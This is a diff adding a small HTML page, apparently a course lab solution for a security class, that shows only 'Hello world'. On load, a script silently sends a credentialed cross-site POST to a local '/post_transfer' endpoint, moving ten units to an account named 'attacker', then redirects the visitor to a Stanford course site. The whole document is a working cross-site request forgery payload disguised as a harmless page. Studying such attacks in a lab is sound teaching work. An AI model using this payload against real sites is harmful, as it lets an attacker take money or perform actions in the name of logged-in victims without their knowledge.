@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width">
+  <title>replit</title>
+  <link href="style.css" rel="stylesheet" type="text/css" />
+</head>
+
+<body>
+  Hello world
+  <script>
+    var params = 'destination_username=attacker&quantity=10';
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.withCredentials = true;
+    
+    xmlHttp.onload = () => {
+      window.location = 'https://cs155.stanford.edu';
+    }
+
+    const url = encodeURI(`http://localhost:3000/post_transfer`);
+    xmlHttp.open("post", url); 
+    xmlHttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    xmlHttp.send(params);
+  </script>
+</body>
+
+</html>
